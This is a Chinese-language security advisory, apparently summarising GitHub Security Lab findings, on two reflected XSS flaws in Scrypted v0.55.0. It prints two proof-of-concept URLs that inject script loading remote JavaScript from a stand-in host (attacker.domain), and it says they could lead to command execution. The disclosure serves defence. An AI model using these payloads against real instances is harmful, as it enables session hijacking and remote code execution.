# GHSL-2023-218 和 GHSL-2023-219: Scrypted中的跨站脚本攻击 (XSS)

在Scrypted软件中发现了两个反射型跨站脚本攻击（XSS）漏洞。这些漏洞可能允许攻击者通过特制的链接冒充任何用户，甚至可能冒充管理员并执行任意命令。

## 技术基础知识

### 什么是跨站脚本攻击 (XSS)？

跨站脚本攻击（XSS）是一种安全漏洞，攻击者可以通过在网页中注入恶意JavaScript代码，使得不知情的用户执行该代码。通常，这种攻击依赖于用户点击一个带有恶意脚本的链接。

### 漏洞描述

1. **反射型 XSS 漏洞**
   - 在Scrypted v0.55.0版本中，参数`owner`和`pkg`在响应中被直接返回，这导致了反射型XSS漏洞的产生。
   - 攻击者可以利用此漏洞进行远程代码执行（RCE）。

### 证明概念（Proof of Concept）

- **漏洞利用示例**
  
  以下链接将创建一个`<script>`标签，当用户访问该链接后，恶意脚本`attacker.domain/rce.js`将被加载：
  ```
  https://localhost:10443/endpoint/<img src onerror=a=document.createElement('script');a.setAttribute('src',document.location.hash.substr(1));document.head.appendChild(a>/pkg#//attacker.domain/rce.js
  ```
  - 用户的浏览器将执行该JavaScript代码，可能泄露服务器信息并执行shell命令。

2. **登录页面的反射型 XSS**
   - 在登录页面中，通过`redirect_uri`参数，攻击者可以指定一个`javascript:` URL。
  
  以下示例也展示了如何利用此漏洞：
  ```
  https://localhost:10443/endpoint/test/test?redirect_uri=javascript:var%20script%20=%20document.createElement('script');script.src%20=%20'https://attacker.domain';%20document.head.appendChild(script);#//
  ```
  - 这将加载一个恶意JavaScript文件，可能导致RCE。

### 漏洞发现

这些问题是由GHSL团队成员@Kwstubbs（Kevin Stubbings）发现并报告的。利用CodeQL的反射型XSS查询找到了这些漏洞。

如需联系GHSL团队，请发送邮件至securitylab@github.com，并在任何通讯中提及GHSL-2023-218或GHSL-2023-219以供参考。